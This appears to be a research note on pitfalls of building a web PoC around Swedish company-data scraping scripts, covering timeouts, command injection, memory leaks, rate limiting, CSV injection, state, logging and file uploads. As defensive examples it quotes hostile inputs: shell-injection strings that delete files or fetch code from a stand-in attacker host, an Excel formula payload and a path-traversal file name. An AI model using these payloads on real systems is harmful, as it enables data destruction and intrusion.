# Domain Pitfalls: Web-Based Data Enrichment PoC

**Domain:** Web application wrapping existing Python data enrichment scripts
**Context:** Swedish company data enrichment via web scraping with rate limiting
**Researched:** 2026-01-22
**Confidence:** HIGH (verified with multiple 2026 sources)

## Executive Summary

Building web PoCs that wrap existing CLI scripts presents unique risks. The most critical failures occur at the **interface boundary** (subprocess calls, state management), **operational boundary** (timeouts, memory leaks), and **production boundary** (moving from PoC to production-ready). Teams commonly underestimate synchronous processing limits, security implications of subprocess execution, and the architectural gap between "works for 5 companies" and "works for 500."

---

## Critical Pitfalls

These mistakes cause rewrites, security incidents, or major production issues.

### Pitfall 1: Synchronous Request Timeout Hell

**What goes wrong:**
Web scraping 10-20 companies synchronously in a single HTTP request causes browser/server timeouts. Users see "504 Gateway Timeout" or frozen UI, jobs partially complete with no visibility into progress.

**Why it happens:**

- Web scraping is I/O-bound and slow (rate limiting delays compound)
- HTTP request timeouts (typical: 30-120 seconds) < actual job time
- PoC developers think "it only takes 2 minutes" without accounting for variance
- Synchronous operations in Python frameworks have 2-15 minute hard limits

**Consequences:**

- Users lose work (no results returned after timeout)
- Cannot process larger batches without complete rewrite
- Server resources locked during long operations
- No way to show progress or cancel jobs

**Prevention:**

1. **Never run scraping in the request handler** - even for small batches
2. **Move to async task queue immediately** (even in PoC phase):
   - Minimal: Store job state in JSON file, poll endpoint for status
   - Better: Use Redis + background worker pattern
   - Best: Celery, RQ, or similar task queue
3. **Design API contract for async from day 1**:
   ```python
   POST /enrich → {job_id: "abc123", status: "queued"}
   GET /jobs/abc123 → {status: "processing", progress: "5/20"}
   GET /jobs/abc123/results → {data: [...]}
   ```
4. **Set explicit timeouts** for HTTP calls in scraping code
5. **Return response immediately** with job tracking URL

**Detection:**

- Request takes >30 seconds locally
- Browser shows "waiting for response" spinner indefinitely
- Nginx/Apache logs show increasing request durations
- Users report "nothing happens after upload"

**Phase assignment:**

- Phase 1 (MVP): Implement basic async pattern with JSON state file
- Phase 2: Add proper task queue and progress tracking

**Sources:**

- [Synchronous vs Asynchronous Requests - MDN](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest_API/Synchronous_and_Asynchronous_Requests)
- [Backend and Frontend Timeouts - Medium](https://medium.com/@ritikasharma.sharma97/backend-and-frontend-timeouts-what-you-need-to-know-b95d2a7b6f6d)
- [Asynchronous Processing Guide - Salesforce](https://architect.salesforce.com/decision-guides/async-processing)

---

### Pitfall 2: subprocess Security Nightmare (Command Injection)

**What goes wrong:**
Calling existing Python scripts via `subprocess.run(f"python script.py {user_input}", shell=True)` enables command injection attacks. Attacker uploads CSV with filename `data.csv; rm -rf /` or company name `"; wget attacker.com/malware; #"`.

**Why it happens:**

- Wrapping existing CLI scripts feels like the "quick" path
- Developers don't realize `shell=True` interprets metacharacters (; && | ` $())
- Input validation seems "good enough" for PoC
- "We don't have auth, so nobody will attack us" mindset

**Consequences:**

- Remote code execution (RCE) - attacker can run arbitrary commands
- Data exfiltration, server compromise, ransomware deployment
- Classified as CWE-78: Critical severity vulnerability
- Immediate CVE if discovered, potential regulatory violations

**Prevention:**

1. **NEVER use `shell=True` with any user-controlled input**
2. **Pass commands as list, not string**:

   ```python
   # DANGEROUS
   subprocess.run(f"python script.py --file {filename}", shell=True)

   # SAFE
   subprocess.run(["python", "script.py", "--file", filename], shell=False, timeout=300)
   ```

3. **Whitelist input validation**:
   - File uploads: Check extension AND content type AND scan first 512 bytes
   - Company names: Regex validation `^[A-Za-z0-9\s\-åäöÅÄÖ]+$` for Swedish characters
   - Paths: Use `pathlib.Path().resolve()` to prevent directory traversal
4. **Better approach: Import scripts as modules**:
   ```python
   # Instead of subprocess
   from enrichment_scripts import enrich_company
   result = enrich_company(company_data, timeout=60)
   ```
5. **If subprocess is required**:
   - Use `shlex.quote()` for shell escaping (last resort)
   - Run in sandboxed environment (Docker, chroot)
   - Set timeout parameter ALWAYS
   - Drop privileges before execution

**Detection:**

- `grep "shell=True" *.py` finds vulnerable patterns
- Security scanners (Bandit, Semgrep) flag subprocess issues
- Code review: Any string concatenation near subprocess calls
- Penetration testing with payloads: `test; whoami`, `$(curl attacker.com)`

**Phase assignment:**

- Phase 0 (Pre-PoC): Refactor scripts to be importable modules OR secure subprocess calls
- All phases: Input validation at API boundary

**Sources:**

- [Python Subprocess Security - Codiga](https://www.codiga.io/blog/python-subprocess-security/)
- [Command Injection in Python - Snyk](https://snyk.io/blog/command-injection-python-prevention-examples/)
- [Use Subprocess Securely - OpenStack Security](https://security.openstack.org/guidelines/dg_use-subprocess-securely.html)
- [Command Injection in Python - Semgrep](https://semgrep.dev/docs/cheat-sheets/python-command-injection)

---

### Pitfall 3: Memory Leak Cascade (Browser Automation)

**What goes wrong:**
If using Selenium/Playwright for scraping, failing to properly close browser contexts causes memory to grow indefinitely. Server runs out of RAM after 50-100 jobs, crashes, requires manual restart.

**Why it happens:**

- Browser automation creates heavy objects (browser instances, contexts, pages)
- Exception during scraping exits handler before cleanup code runs
- "It works on my laptop" (8 jobs) doesn't show leak (appears at 50+)
- Creating new browser context per page is common beginner pattern

**Consequences:**

- Server OOM (Out of Memory) kills
- Degraded performance as swap fills
- Jobs fail randomly when memory exhausted
- Production downtime, angry users, manual intervention required

**Prevention:**

1. **Always use context managers**:
   ```python
   async with async_playwright() as p:
       async with p.chromium.launch() as browser:
           async with browser.new_context() as context:
               # Scraping code here
               pass  # Cleanup happens automatically
   ```
2. **Reuse browser instance, create contexts per job** (not per page)
3. **Set maximum concurrent jobs** based on memory limits
4. **Implement resource limits**:
   ```python
   import resource
   resource.setrlimit(resource.RLIMIT_AS, (2 * 1024**3, -1))  # 2GB max
   ```
5. **Monitor memory usage**:
   - Log memory before/after each job
   - Alert when memory growth exceeds threshold
   - Implement graceful restart after N jobs
6. **Close resources in finally blocks**:
   ```python
   browser = None
   try:
       browser = await playwright.chromium.launch()
       # Work
   finally:
       if browser:
           await browser.close()
   ```

**Detection:**

- `ps aux | grep python` shows growing memory (RES column)
- Application logs show successful jobs but memory doesn't drop
- Server becomes unresponsive after running for hours
- Monitoring tools (Datadog, Sentry) show memory trending upward

**Phase assignment:**

- Phase 1 (MVP): Proper context managers and resource cleanup
- Phase 2: Memory monitoring and automatic restart policies
- Phase 3: Kubernetes resource limits and horizontal scaling

**Sources:**

- [Memory Leak: How to Find, Fix & Prevent - Browserless](https://www.browserless.io/blog/memory-leak-how-to-find-fix-prevent-them)
- [Finding Memory Leaks in Web Apps - GitHub/Fuite](https://github.com/nolanlawson/fuite)
- [Memory Leaks in Web Applications - Sematext](https://sematext.com/blog/web-application-memory-leaks/)

---

### Pitfall 4: Rate Limit Violation Cascade

**What goes wrong:**
Scraping logic works fine for 5 companies in testing, but processing 20 companies in production triggers rate limits. All 20 jobs fail with HTTP 429 errors, IP gets banned, no results returned. Retry logic makes it worse by hammering the endpoint.

**Why it happens:**

- Rate limits are per-minute/per-hour, small batches don't trigger them
- No exponential backoff in retry logic
- Each company scrapes multiple pages (10 companies × 5 pages = 50 requests)
- Concurrent processing multiplies request rate

**Consequences:**

- IP address banned (can last hours to days)
- Zero data enrichment while banned
- Retry storms make ban permanent
- Need to rotate IPs or wait for unban
- Users blame your service, not the upstream

**Prevention:**

1. **Respect Retry-After headers**:
   ```python
   if response.status_code == 429:
       retry_after = int(response.headers.get('Retry-After', 60))
       await asyncio.sleep(retry_after)
   ```
2. **Implement exponential backoff**:
   ```python
   for attempt in range(max_retries):
       try:
           response = fetch()
           break
       except RateLimitError:
           wait = (2 ** attempt) + random.uniform(0, 1)
           await asyncio.sleep(wait)
   ```
3. **Add jitter to prevent thundering herd**
4. **Monitor rate limit consumption**:
   - Track requests per minute
   - Slow down before hitting limit (use 80% of allowed rate)
5. **Queue jobs with controlled concurrency**:
   - Process 1-2 companies concurrently (not all 20)
   - Space requests 2-5 seconds apart
6. **Cache aggressively**:
   - Don't re-fetch same company within 24 hours
   - Store partial results to resume failed jobs

**Detection:**

- HTTP 429 errors in logs
- Sudden spike in failed jobs after batch increase
- Response headers showing `X-RateLimit-Remaining: 0`
- Scraping that worked yesterday fails today at scale

**Phase assignment:**

- Phase 1 (MVP): Basic exponential backoff and Retry-After handling
- Phase 2: Request rate monitoring and throttling
- Phase 3: Distributed rate limiting for multi-worker setups

**Sources:**

- [Rate Limit in Web Scraping - Scrape.do](https://scrape.do/blog/web-scraping-rate-limit/)
- [Bypass Rate Limit While Web Scraping - ZenRows](https://www.zenrows.com/blog/web-scraping-rate-limit)
- [Dealing with Rate Limiting Using Exponential Backoff](https://substack.thewebscraping.club/p/rate-limit-scraping-exponential-backoff)
- [HTTP 429 Error in Web Scraping - Firecrawl](https://www.firecrawl.dev/glossary/web-scraping-apis/what-is-429-error-web-scraping)

---

## Moderate Pitfalls

These cause delays, technical debt, or operational pain but don't require full rewrites.

### Pitfall 5: CSV Injection Vulnerability

**What goes wrong:**
User uploads CSV with company data. Malicious cell contains `=cmd|'/c calc'!A1` (Excel formula). When enriched results are downloaded and opened in Excel, formula executes arbitrary commands.

**Why it happens:**

- CSV files are trusted as "just data"
- Excel interprets cells starting with `=`, `+`, `-`, `@` as formulas
- Web app passes through user content without sanitization
- Testing uses clean data, doesn't check for injection payloads

**Consequences:**

- Code execution on user's machine (when they open results in Excel)
- Data exfiltration via web requests in formulas
- Reputational damage if exploited
- Regulatory compliance violations (GDPR, etc.)

**Prevention:**

1. **Sanitize CSV output** - prefix dangerous characters:
   ```python
   def sanitize_csv_cell(value):
       if isinstance(value, str) and value and value[0] in '=+-@':
           return "'" + value  # Escape with single quote
       return value
   ```
2. **Validate input CSV** - reject cells starting with formula characters
3. **Use CSV libraries with injection protection**:
   ```python
   import csv
   # Set QUOTE_NONNUMERIC to force quoting
   writer = csv.writer(f, quoting=csv.QUOTE_NONNUMERIC)
   ```
4. **Warn users** about opening CSVs in Excel (prefer Google Sheets for preview)
5. **Content Security Policy** for web-based preview

**Detection:**

- Security scanner (OWASP ZAP) with CSV injection checks
- Manual testing: Upload CSV with `=1+1` and check if preserved in output
- Code review: Search for unescaped CSV writing

**Phase assignment:**

- Phase 1 (MVP): Input/output sanitization
- Phase 2: Automated security testing in CI/CD

**Sources:**

- [File Upload Vulnerabilities - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
- [CSV Injection Attacks - Cobalt](https://www.cobalt.io/blog/file-upload-vulnerabilities)
- [File Upload Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

### Pitfall 6: State Management Confusion

**What goes wrong:**
Job state stored in global variables or class attributes. Concurrent requests overwrite each other's state. User A's job shows User B's companies, or results get mixed between batches.

**Why it happens:**

- "No auth" = developers assume single user
- CLI script uses global state, web wrapper inherits pattern
- Flask/FastAPI tutorials use simple examples without concurrency
- Threading model not understood (workers share memory)

**Consequences:**

- Data leakage between jobs/users
- Incorrect results returned
- Race conditions cause random failures
- Cannot scale to multiple workers

**Prevention:**

1. **Never use global state for job data**:

   ```python
   # BAD - Global state
   current_job_data = {}

   # GOOD - Pass state explicitly
   def process_job(job_id: str, data: dict):
       job_state = load_job_state(job_id)
       # Process using job_state
   ```

2. **Store job state externally**:
   - File system: `jobs/{job_id}.json`
   - Redis: `SET job:{job_id} {json_data}`
   - Database: Job table with status column
3. **Use unique job IDs**:
   ```python
   import uuid
   job_id = str(uuid.uuid4())
   ```
4. **Test with concurrent requests**:
   ```python
   import concurrent.futures
   with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
       futures = [executor.submit(enrich_batch, data) for _ in range(10)]
   ```
5. **Make functions pure/stateless** where possible

**Detection:**

- Results contain data from wrong job
- `pytest` with `pytest-xdist` (parallel tests) fails randomly
- Logs show interleaved job processing with wrong data
- Load testing reveals race conditions

**Phase assignment:**

- Phase 1 (MVP): External state storage (JSON files minimum)
- Phase 2: Redis or database-backed state management
- Phase 3: Distributed state for multi-server deployment

**Sources:**

- [Broken Session Management - SecureFlag](https://knowledge-base.secureflag.com/vulnerabilities/broken_authentication/broken_session_management_vulnerability.html)
- [State Management Mistakes - Medium](https://medium.com/@divyanshbarar/3-big-mistakes-to-avoid-while-state-management-87daa072ee76)
- [State Management in 2026 - Nucamp](https://www.nucamp.co/blog/state-management-in-2026-redux-context-api-and-modern-patterns)

---

### Pitfall 7: Production Logging Blindness

**What goes wrong:**
PoC has no structured logging. Production issues manifest as "it stopped working." No visibility into which company failed, what error occurred, or how to reproduce. Debugging requires adding print statements and redeploying.

**Why it happens:**

- PoC uses `print()` statements for debugging
- "We'll add logging later" mentality
- Unclear what to log vs what's noise
- No log aggregation strategy

**Consequences:**

- Hours spent debugging issues that happened hours ago
- Cannot diagnose production problems without reproducing
- No audit trail for compliance
- User reports issues you can't verify or fix

**Prevention:**

1. **Use structured logging from day 1**:

   ```python
   import structlog
   logger = structlog.get_logger()

   logger.info("job_started",
               job_id=job_id,
               company_count=len(companies),
               user_id=user_id)
   ```

2. **Log critical decision points**:
   - Job start/complete with timing
   - Each company processed (success/failure)
   - Rate limit hits and backoff delays
   - External API calls and responses
   - Validation failures with input data
3. **Include correlation IDs**:
   ```python
   # Add job_id to all logs for that request
   logger = logger.bind(job_id=job_id)
   ```
4. **Set appropriate log levels by environment**:
   - Development: DEBUG (all details)
   - Production: INFO (key events only)
   - Never: DEBUG in production (performance killer)
5. **One-line format for production**:
   ```
   [INFO] job_complete job_id=abc123 duration=45.2s companies=20 success=18 failed=2
   ```
6. **Log errors with context**:
   ```python
   except Exception as e:
       logger.error("enrichment_failed",
                    job_id=job_id,
                    company=company_name,
                    error=str(e),
                    traceback=traceback.format_exc())
       raise
   ```

**Detection:**

- Production issue occurs, no way to diagnose
- Logs filled with print statements and debug messages
- Cannot answer "what failed for this job?"
- Log files exceed 1GB (too much noise)

**Phase assignment:**

- Phase 1 (MVP): Structured logging setup with job_id correlation
- Phase 2: Log aggregation (ELK, Datadog, CloudWatch)
- Phase 3: Alerting and dashboards

**Sources:**

- [Production Logs Forced API Error Handling Simplification - DEV](https://dev.to/rohit_gavali_0c2ad84fe4e0/how-production-logs-forced-me-to-simplify-api-error-handling-388f)
- [Python Logging Module Complete Guide - Dash0](https://www.dash0.com/guides/logging-in-python)
- [Log Levels Explained - Better Stack](https://betterstack.com/community/guides/logging/log-levels-explained/)
- [Error Handling and Logging Checklist - Ian's Research](https://www.iansresearch.com/resources/all-blogs/post/security-blog/2023/08/17/error-handling-and-logging-checklist)

---

### Pitfall 8: File Upload Validation Bypass

**What goes wrong:**
App expects CSV upload, validates by `.csv` extension. User uploads `.csv.exe` or ZIP file renamed to `.csv`. Server tries to parse as CSV, crashes or executes malicious code.

**Why it happens:**

- Only checking file extension (client-controlled)
- Not validating file content/magic bytes
- Trusting user-provided MIME types
- "We only use it internally" mentality

**Consequences:**

- Arbitrary file upload leading to stored XSS or RCE
- Denial of service from malformed files
- Disk filling attack (upload huge files)
- Server compromise if files executed

**Prevention:**

1. **Validate file content, not just extension**:

   ```python
   import magic

   def validate_csv_upload(file):
       # Check magic bytes
       file_type = magic.from_buffer(file.read(2048), mime=True)
       if file_type not in ['text/plain', 'text/csv', 'application/csv']:
           raise ValueError("Invalid file type")
       file.seek(0)  # Reset for reading

       # Parse as CSV to validate structure
       try:
           csv.reader(file)
       except csv.Error:
           raise ValueError("Invalid CSV format")
   ```

2. **Enforce size limits**:
   ```python
   MAX_UPLOAD_SIZE = 10 * 1024 * 1024  # 10MB
   if file.size > MAX_UPLOAD_SIZE:
       raise ValueError("File too large")
   ```
3. **Sanitize filenames**:

   ```python
   import re
   from pathlib import Path

   def safe_filename(filename):
       # Remove path components
       filename = Path(filename).name
       # Keep only alphanumeric and safe chars
       filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)
       # Generate unique name
       return f"{uuid.uuid4()}_{filename}"
   ```

4. **Store uploads outside webroot** (prevent direct access)
5. **Run virus scanning** if handling external uploads
6. **Set upload directory permissions** (no execute)

**Detection:**

- Upload files with wrong extensions (`.exe`, `.php`, `.jsp`)
- Upload huge files (test size limit)
- Upload files with path traversal (`../../etc/passwd.csv`)
- Security scanner (Burp Suite) file upload tests

**Phase assignment:**

- Phase 1 (MVP): Content validation and size limits
- Phase 2: Virus scanning and secure storage
- Phase 3: Content Security Policy and sandboxed preview

**Sources:**

- [File Upload Vulnerabilities - PortSwigger](https://portswigger.net/web-security/file-upload)
- [Unrestricted File Upload - OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [File Upload Security - OPSWAT](https://www.opswat.com/solutions/application-security/file-upload-security)

---

## Minor Pitfalls

Common mistakes that cause annoyance but are easily fixable.

### Pitfall 9: Scope Creep During PoC

**What goes wrong:**
PoC starts as "simple web UI for 20 companies." Stakeholders request user management, scheduling, email notifications, historical tracking. PoC takes 3 months instead of 2 weeks, never launches.

**Why it happens:**

- No clear success criteria defined upfront
- Stakeholders see UI, imagine features
- Developer wants to impress with polish
- "While we're at it" mindset

**Consequences:**

- PoC timeline explodes
- Core functionality delayed
- Team burnout
- Value never delivered

**Prevention:**

1. **Define PoC scope in writing BEFORE coding**:

   ```
   IN SCOPE:
   - Upload CSV with 20 companies
   - Enrich with org number, address, employees
   - Download results as CSV

   OUT OF SCOPE (post-PoC):
   - User accounts/authentication
   - Job history
   - Scheduling
   - Email notifications
   ```

2. **Set feature freeze date**: "No new features after Friday"
3. **Use "PoC backlog"** for future ideas (don't say no, say "after PoC")
4. **Time-box PoC**: "We launch in 2 weeks with what we have"
5. **Focus on core value proposition**: Prove enrichment works, not build full product

**Detection:**

- PoC timeline keeps extending
- New features added every meeting
- Core functionality still not working
- Team discussing authentication systems

**Phase assignment:**

- Phase 0 (Pre-PoC): Document scope boundaries
- All phases: Maintain "next phase" backlog for deferred features

**Sources:**

- [Common PoC Pitfalls - Success Platform](https://www.success.app/blog/common-poc-pitfalls/)
- [Proof of Concept in Software - Netguru](https://www.netguru.com/blog/proof-of-concept-in-software-development)

---

### Pitfall 10: No Clear Success Criteria

**What goes wrong:**
PoC finishes, but unclear if it "succeeded." Stakeholders have different opinions on next steps. Project stalls in "let's add one more thing" limbo.

**Why it happens:**

- Success metrics not defined upfront
- "Let's build it and see" approach
- Confusing PoC goals with product goals
- No decision-maker empowered

**Consequences:**

- Cannot determine if PoC validates hypothesis
- Endless tweaking instead of deciding
- Team morale drops (unclear if work matters)
- PoC becomes zombie project

**Prevention:**

1. **Define success criteria before building**:

   ```
   PoC succeeds if:
   - Can enrich 20 companies in <5 minutes
   - Accuracy >90% for org number/address
   - Stakeholders can use UI without training
   - Total cost <500 SEK for 20 companies

   Decision point: If success → build Phase 2
   If failure → pivot to different approach
   ```

2. **Quantify metrics**: Not "fast enough" but "under 5 minutes"
3. **Include go/no-go decision process**: Who decides and when
4. **Test with real data**: Not just happy-path examples
5. **Set decision deadline**: "We decide on launch by March 1"

**Detection:**

- PoC demo meets, no decision made
- "Let's add just one more feature" repeated
- Unclear what success looks like
- Different stakeholders have different expectations

**Phase assignment:**

- Phase 0 (Pre-PoC): Document success criteria and decision process

**Sources:**

- [Common PoC Pitfalls - Success Platform](https://www.success.app/blog/common-poc-pitfalls/)
- [PoC in Software Development - Designveloper](https://www.designveloper.com/blog/poc-in-software/)

---

### Pitfall 11: GIL Confusion (Threading vs Async)

**What goes wrong:**
Developer uses Python threading for web scraping, expecting parallelism. Global Interpreter Lock (GIL) prevents true parallelism. Performance gains minimal or negative due to thread overhead.

**Why it happens:**

- Misunderstanding GIL behavior
- "Threading = parallel" assumption from other languages
- Not distinguishing CPU-bound vs I/O-bound tasks
- Copy-paste threading examples without understanding

**Consequences:**

- Expected 5x speedup, got 1.1x
- Added complexity with little benefit
- Race conditions introduced for no gain
- Harder to debug than async code

**Prevention:**

1. **Understand I/O-bound vs CPU-bound**:
   - Web scraping = I/O-bound → Use `asyncio` or `threading`
   - Data processing = CPU-bound → Use `multiprocessing`
2. **For web scraping, prefer `asyncio`**:

   ```python
   import asyncio
   import httpx

   async def scrape_company(client, company):
       response = await client.get(f"/company/{company}")
       return parse(response)

   async def main():
       async with httpx.AsyncClient() as client:
           tasks = [scrape_company(client, c) for c in companies]
           results = await asyncio.gather(*tasks)
   ```

3. **Threading is okay for I/O** (GIL released during I/O):

   ```python
   from concurrent.futures import ThreadPoolExecutor

   with ThreadPoolExecutor(max_workers=5) as executor:
       results = list(executor.map(scrape_company, companies))
   ```

4. **Avoid threading for CPU-heavy parsing** - use `multiprocessing`
5. **Framework matters**:
   - FastAPI: Native async support
   - Flask: Threading or external task queue

**Detection:**

- Threading code doesn't speed up processing
- CPU profiling shows threads waiting on GIL
- Async code outperforms threading significantly
- Unexplained race conditions

**Phase assignment:**

- Phase 1 (MVP): Choose async (FastAPI) or threading (Flask) consistently
- Phase 2: Optimize with profiling data

**Sources:**

- [Python Web Scraping Concurrency - ZenRows](https://www.zenrows.com/blog/speed-up-web-scraping-with-concurrency-in-python)
- [FastAPI vs Flask Concurrency - Developers Voice](https://developersvoice.com/blog/python/fastapi_django_flask_architecture_guide/)
- [FastAPI Async Documentation](https://fastapi.tiangolo.com/async/)

---

### Pitfall 12: Hardcoded Configuration

**What goes wrong:**
Script paths, rate limits, API keys hardcoded in source code. Changing batch size requires code change and redeploy. Cannot test against staging environment without editing code.

**Why it happens:**

- PoC prioritizes speed over flexibility
- "We'll externalize config later"
- Unclear what should be configurable
- Not thinking about different environments

**Consequences:**

- Cannot deploy to different environments
- Secrets leaked in Git history
- Testing requires code changes
- Cannot adjust without redeploy

**Prevention:**

1. **Use environment variables**:

   ```python
   import os

   RATE_LIMIT_DELAY = int(os.getenv("RATE_LIMIT_DELAY", "3"))
   MAX_WORKERS = int(os.getenv("MAX_WORKERS", "2"))
   SCRIPT_PATH = os.getenv("SCRIPT_PATH", "./enrichment_scripts")
   ```

2. **Config file for complex settings**:

   ```python
   # config.yaml
   scraping:
     rate_limit_delay: 3
     max_retries: 5
     timeout: 60

   # Load in Python
   import yaml
   with open("config.yaml") as f:
       config = yaml.safe_load(f)
   ```

3. **Never commit secrets**:
   - Use `.env` file (add to `.gitignore`)
   - Use environment variables in production
   - Use secrets manager for production (AWS Secrets Manager, etc.)
4. **Validate config on startup**:
   ```python
   required = ["DATABASE_URL", "API_KEY"]
   missing = [k for k in required if not os.getenv(k)]
   if missing:
       raise ValueError(f"Missing config: {missing}")
   ```
5. **Document configuration options** in README

**Detection:**

- `grep -r "api_key =" *.py` finds hardcoded values
- Cannot deploy to staging without code change
- Secrets visible in Git history (`git log -p | grep -i password`)

**Phase assignment:**

- Phase 1 (MVP): Environment variables for all config
- Phase 2: Secrets manager integration

---

## Phase-Specific Warnings

| Phase         | Topic              | Likely Pitfall                                              | Mitigation                                |
| ------------- | ------------------ | ----------------------------------------------------------- | ----------------------------------------- |
| Pre-PoC       | Script Refactoring | Subprocess security hole (Pitfall #2)                       | Refactor scripts to be importable modules |
| Phase 1 (MVP) | Async Processing   | Synchronous timeout (Pitfall #1)                            | Implement async job pattern from day 1    |
| Phase 1 (MVP) | Input Validation   | CSV injection (Pitfall #5), File upload bypass (Pitfall #8) | Whitelist validation, content checking    |
| Phase 1 (MVP) | State Management   | Global state race conditions (Pitfall #6)                   | External state storage (JSON/Redis)       |
| Phase 1 (MVP) | Logging            | Production blindness (Pitfall #7)                           | Structured logging with correlation IDs   |
| Phase 2       | Scaling            | Memory leaks (Pitfall #3)                                   | Proper resource cleanup, monitoring       |
| Phase 2       | Rate Limiting      | Cascade failures (Pitfall #4)                               | Exponential backoff, request throttling   |
| Phase 3       | Multi-worker       | Distributed state consistency                               | Redis/database state, not files           |
| Phase 3       | Production         | Missing monitoring/alerting                                 | APM tools, error tracking, dashboards     |

---

## PoC-to-Production Gap

**The critical transition**: PoC proves concept works. Production proves it works reliably at scale. Common mistakes treating them as the same:

### What Changes from PoC to Production

| Aspect         | PoC                | Production                                            |
| -------------- | ------------------ | ----------------------------------------------------- |
| Error handling | `try/except: pass` | Structured errors, retries, alerting                  |
| Logging        | `print()`          | Structured logs, correlation IDs, aggregation         |
| Validation     | Basic type checks  | Whitelist validation, sanitization, security scanning |
| State          | Global variables   | External storage (Redis/DB)                           |
| Processing     | Synchronous        | Async task queue                                      |
| Configuration  | Hardcoded          | Environment-based, secrets manager                    |
| Testing        | Manual happy path  | Automated tests, load testing, security testing       |
| Monitoring     | None               | APM, error tracking, dashboards, alerts               |
| Deployment     | `python app.py`    | Containerized, orchestrated, auto-scaling             |
| Documentation  | None               | API docs, runbooks, architecture diagrams             |

### The "Works on My Machine" Checklist

Before calling PoC "production-ready," verify:

- [ ] Can handle 10x expected load without crashing
- [ ] Gracefully handles timeouts and rate limits
- [ ] All resources properly cleaned up (no leaks)
- [ ] Security: Input validation, no command injection, no hardcoded secrets
- [ ] Observability: Structured logging, metrics, error tracking
- [ ] Deployment: Can deploy to clean environment from README
- [ ] Recovery: Can restart after crash and resume jobs
- [ ] Monitoring: Alerts fire before users complain

---

## Research Confidence Assessment

| Topic                           | Confidence | Sources                                               |
| ------------------------------- | ---------- | ----------------------------------------------------- |
| Synchronous processing timeouts | HIGH       | MDN, Medium (3 sources), verified 2026                |
| Subprocess security             | HIGH       | Snyk, OpenStack, Semgrep (official docs)              |
| Memory leaks                    | HIGH       | Browserless, GitHub/Fuite (tools), Sematext           |
| Rate limiting                   | HIGH       | ZenRows, Scrape.do, The Web Scraping Club (4 sources) |
| CSV injection                   | HIGH       | OWASP, Cobalt (security authorities)                  |
| State management                | MEDIUM     | Multiple sources but less domain-specific             |
| Logging                         | HIGH       | Multiple 2025-2026 sources, production context        |
| File upload security            | HIGH       | OWASP, PortSwigger (security standards)               |
| PoC scope creep                 | MEDIUM     | General PoC guidance, not specific to data enrichment |
| GIL/concurrency                 | HIGH       | Official FastAPI docs, ZenRows (2026)                 |

---

## Key Takeaways

1. **Async from day 1** - Don't build synchronous, refactor later is painful
2. **Security at the boundary** - Input validation and subprocess safety are non-negotiable
3. **Resource cleanup** - Memory leaks kill production apps, easy to prevent
4. **Rate limiting is real** - Works at small scale != works at production scale
5. **PoC != Production** - Budget time for production hardening (typically 2-3x PoC time)
6. **Log everything** - Future you (at 3am debugging) will be grateful
7. **Scope discipline** - Clear success criteria prevent endless PoC tweaking

The most expensive mistakes are those caught in production. Build PoC with production patterns from the start.
